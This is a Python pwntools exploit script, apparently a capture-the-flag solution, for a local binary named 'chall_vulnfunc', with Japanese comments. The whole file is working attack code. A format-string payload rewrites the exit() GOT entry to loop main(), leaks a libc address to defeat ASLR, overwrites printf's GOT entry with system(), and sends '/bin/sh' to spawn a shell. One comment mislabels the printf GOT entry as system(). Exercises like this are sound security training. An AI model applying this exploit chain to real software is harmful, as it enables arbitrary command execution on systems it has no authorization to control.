#!/usr/bin/env python3
from pwn import *

bin_file = './chall_vulnfunc'
context(os = 'linux', arch = 'amd64')
# context(terminal = ['tmux', 'splitw', '-v'])
context.log_level = 'debug'

binf = ELF(bin_file)
addr_main           = binf.functions['main'].address	# main()のアドレス
addr_got_exit       = binf.got['exit']					# GOTテーブル:exit()のアドレス
addr_got_printf     = binf.got['printf']				# GOTテーブル:system()のアドレス

libc = binf.libc
offset_libc_read    = libc.functions['read'].address	# libcのread()のアドレス

def attack(conn, **kwargs):

    overwrite = {addr_got_exit : addr_main}				# exit()のGOTをmain()に書き換えるための辞書
    
    # 書式文字列攻撃用のペイロード作成
    """
    offset		：フォーマットストリングの「%n」がスタックの何番目にあるか（%x で調べる）
    writes		：書き込みたいアドレスと値の辞書（例：{0xdeadbeef: 0x41414141}）
    numbwritten	：すでに出力されたバイト数（printf の返り値）
    write_size	：'byte', 'short', 'int' のどれか。何バイトずつ書き込むか
    """
    exploit = fmtstr_payload(6, overwrite, numbwritten = 0, write_size = 'short')
    conn.sendafter('message\n', exploit)

	# readのアドレスをリークする
    conn.sendlineafter('message\n', '%3$p')
    addr_libc_read = int(conn.recvline(keepends=False), 16) - 0x12
    libc.address = addr_libc_read - offset_libc_read
    info('addr_libc_base = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.functions['system'].address

	# printf()のGOTをsystem()に書き換え
    exploit  = '%{}c'.format((addr_libc_system >> 16) & 0xff)
    exploit += '%10$hhn'
    exploit += '%{}c'.format((addr_libc_system & 0xffff) - ((addr_libc_system >> 16) & 0xff))
    exploit += '%11$hn'
    exploit  = exploit.ljust(0x20, 'x').encode()
    exploit += flat(addr_got_printf+2, addr_got_printf) # 10, 11
    conn.sendafter('message\n', exploit)
    conn.sendafter('message\n', '/bin/sh')

def main():
    # conn = gdb.debug(bin_file)
    conn = process(bin_file)
    attack(conn)
    conn.interactive()

if __name__=='__main__':
    main()
